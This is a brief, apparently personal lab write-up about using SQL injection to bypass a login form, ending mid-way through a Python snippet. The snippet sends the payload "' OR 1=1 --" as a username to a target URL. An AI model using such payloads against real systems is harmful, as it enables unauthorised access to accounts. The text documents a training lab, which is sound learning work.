# Cracking the Lab: SQL Injection
**Date:** Jan 08, 2026

## Overview
In this lab, I exploited a Blind SQL Injection vulnerability to bypass authentication.

## The Approach
I started by testing standard payloads on the login form.

```python
import requests

url = "[http://target.com/login](http://target.com/login)"
payload = "' OR 1=1 --"
r = requests.post(url, data={'username': payload})
print(r.status_code)